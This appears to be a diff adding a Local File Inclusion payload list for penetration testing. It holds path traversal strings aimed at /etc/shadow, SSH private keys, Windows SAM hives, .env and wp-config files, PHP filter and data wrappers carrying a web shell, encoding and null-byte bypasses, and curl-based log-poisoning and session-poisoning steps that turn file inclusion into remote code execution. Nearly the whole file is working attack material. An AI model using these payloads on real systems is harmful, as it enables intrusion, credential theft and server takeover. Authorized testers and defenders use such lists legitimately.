@@ -1,0 +1,238 @@
+# Local File Inclusion (LFI) Payloads Collection
+# For authorized security testing only
+
+# ============================================
+# BASIC LFI PAYLOADS
+# ============================================
+
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../etc/hosts
+../../../../../../etc/motd
+../../../../../../etc/os-release
+../../../../../../etc/hostname
+../../../../../../proc/self/environ
+../../../../../../proc/self/cmdline
+../../../../../../proc/self/cgroup
+../../../../../../proc/version
+../../../../../../proc/net/tcp
+../../../../../../var/log/apache2/access.log
+../../../../../../var/log/apache2/error.log
+../../../../../../var/log/nginx/access.log
+../../../../../../var/log/nginx/error.log
+../../../../../../var/log/auth.log
+../../../../../../var/log/syslog
+../../../../../../var/log/mail.log
+../../../../../../var/log/cron
+../../../../../../windows/win.ini
+../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../boot.ini
+../../../../../../autoexec.bat
+
+# Windows-specific
+../../../../../../windows/win.ini
+../../../../../../windows/system32/config/SAM
+../../../../../../windows/system32/config/SYSTEM
+../../../../../../windows/repair/SAM
+../../../../../../inetpub/logs/W3SVC1/u_ex%date%.log
+../../../../../../program files/apache group/apache2/logs/access.log
+../../../../../../program files/mysql/data/mysql/general_log.CSV
+
+# ============================================
+# PHP FILTER ENCODING (Base64)
+# ============================================
+
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/shadow
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=db.php
+php://filter/convert.base64-encode/resource=database.yml
+php://filter/convert.base64-encode/resource=wp-config.php
+php://filter/convert.base64-encode/resource=.env
+php://filter/convert.base64-encode/resource=/proc/self/environ
+php://filter/convert.base64-encode/resource=/proc/self/cmdline
+
+# ROT13 encoding
+php://filter/convert.rot13/resource=/etc/passwd
+
+# Stringtoupper
+php://filter/convert.iconv.utf-8.utf-16be/resource=/etc/passwd
+
+# Quoted-printable
+php://filter/convert.quoted-printable-encode/resource=/etc/passwd
+
+# Base64-encode + convert encoding
+php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16be/resource=/etc/passwd
+php://filter/convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/etc/passwd
+
+# ============================================
+# PHP WRAPPERS
+# ============================================
+
+php://input
+php://stdin
+php://fd/3
+php://fd/0
+php://fd/1
+php://fd/2
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
+data://text/plain,<?php system($_GET['cmd']); ?>
+data://text/plain%2C<?php system($_GET['cmd']); ?>
+
+phar:///var/www/html/file.zip/shell.php
+phar:///tmp/upload.zip/shell.php
+rar:///tmp/upload.rar/shell.php
+zip:///tmp/upload.zip#shell.php
+zip:///tmp/upload.zip%23shell.php
+
+# ============================================
+# PATH TRAVERSAL SEQUENCES
+# ============================================
+
+# Double encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e/%252e%252e/etc/passwd
+
+# Unicode/overlong UTF-8
+%ef%bc%8f%ef%bc%8f%ef%bc%8f
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
+
+# Null byte (older PHP versions)
+../../../../../../etc/passwd%00
+../../../../../../etc/passwd%00.jpg
+../../../../../../etc/passwd%00.php
+
+# Backslash
+..\..\..\..\..\..\..\etc\passwd
+..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
+
+# Dot-truncation (older PHP)
+../../../../../../etc/passwd.............
+../../../../../../etc/passwd.jpg...........
+../../../../../../etc/passwd.php............
+
+# Double-dot variants
+....//....//....//....//etc/passwd
+..../....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+
+# Newline injection
+../../../../../../etc/passwd%0a
+../../../../../../etc/passwd%0d%0a
+
+# ============================================
+# LFI TO RCE TECHNIQUES
+# ============================================
+
+# Log poisoning (Apache)
+# Step 1: Inject PHP code into User-Agent
+curl -A '<?php system($_GET["cmd"]); ?>' http://target/vulnerable.php?file=../../../../../../var/log/apache2/access.log
+
+# Step 2: Include the log file
+http://target/vulnerable.php?file=../../../../../../var/log/apache2/access.log&cmd=whoami
+
+# Log poisoning (Nginx)
+curl -A '<?php system($_GET["cmd"]); ?>' http://target/vulnerable.php?file=../../../../../../var/log/nginx/access.log
+
+# /proc/self/environ poisoning
+curl -A '<?php system($_GET["cmd"]); ?>' http://target/vulnerable.php?file=../../../../../../proc/self/environ
+
+# Session file inclusion
+# Step 1: Inject into session
+curl -A '<?php system($_GET["cmd"]); ?>' -c "PHPSESSID=evil" http://target/vulnerable.php?file=../../../../../../var/lib/php/sessions/sess_evil
+
+# Step 2: Include session file
+http://target/vulnerable.php?file=../../../../../../var/lib/php/sessions/sess_evil&cmd=whoami
+
+# ============================================
+# SENSITIVE FILES TO TARGET
+# ============================================
+
+# Linux
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/sudoers
+/etc/ssh/sshd_config
+/etc/crontab
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/.env
+/var/www/html/config/database.yml
+/proc/self/environ
+/proc/self/cmdline
+/proc/version
+/proc/net/arp
+/home/*/.bash_history
+/home/*/.ssh/id_rsa
+/home/*/.ssh/authorized_keys
+/root/.bash_history
+/root/.ssh/id_rsa
+
+# Windows
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\repair\SAM
+C:\Windows\repair\SYSTEM
+C:\inetpub\logs\W3SVC1\u_ex*.log
+C:\xampp\htdocs\config\config.ini
+C:\wamp\www\config.php
+D:\xampp\htdocs\config\config.ini
+
+# ============================================
+# BYPASS TECHNIQUES
+# ============================================
+
+# Empty string
+....//....//....//etc/passwd
+
+# URL encoding
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# Double URL encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+
+# Non-recursive stripping
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+
+# Wrapping
+php://filter/convert.base64-encode/resource=../../../../etc/passwd
+
+# Null byte (PHP < 5.3.4)
+/etc/passwd%00
+/etc/passwd%00.html
+/etc/passwd%00.jpg
+
+# Special characters
+/etc/passwd.
+/etc/passwd.
+/etc/passwd.......
+
+# Path length truncation
+/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/etc/passwd
+
+# ============================================
+# WINDOWS-SPECIFIC LFI
+# ============================================
+
+# Directory listing
+..\..\..\..\..\windows\temp\
+..\..\..\..\..\windows\temp\..\..\system32\drivers\etc\hosts
+
+# IIS log files
+..\..\..\..\..\inetpub\logs\W3SVC1\u_ex220101.log
+..\..\..\..\..\inetpub\logs\W3SVC1\u_ex220102.log
+
+# IIS app config
+..\..\..\..\..\inetpub\wwwroot\web.config
+..\..\..\..\..\windows\system32\inetsrv\config\applicationHost.config
+
+# Exchange
+..\..\..\..\..\program files\microsoft\exchange server\v15\bin\edgeTransport.exe.config
+..\..\..\..\..\inetpub\wwwroot\owa\auth\config.xml
